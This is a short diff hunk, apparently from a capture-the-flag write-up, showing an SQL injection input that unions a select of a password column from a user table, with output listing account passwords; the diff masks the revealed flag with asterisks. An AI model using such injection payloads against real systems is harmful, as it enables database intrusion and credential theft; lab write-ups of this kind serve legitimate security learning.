@@ -55,4 +55,4 @@ in:
 'union(select(Passowrd)from user)#
 
 out:
-Account:J_password</br>Account:M_password</br>Account:E_password</br>Account:F_password</br>Account:ACTF{YURXMTYS4C1MiSwjPBZc}
+Account:J_password</br>Account:M_password</br>Account:E_password</br>Account:F_password</br>Account:ACTF{*********}
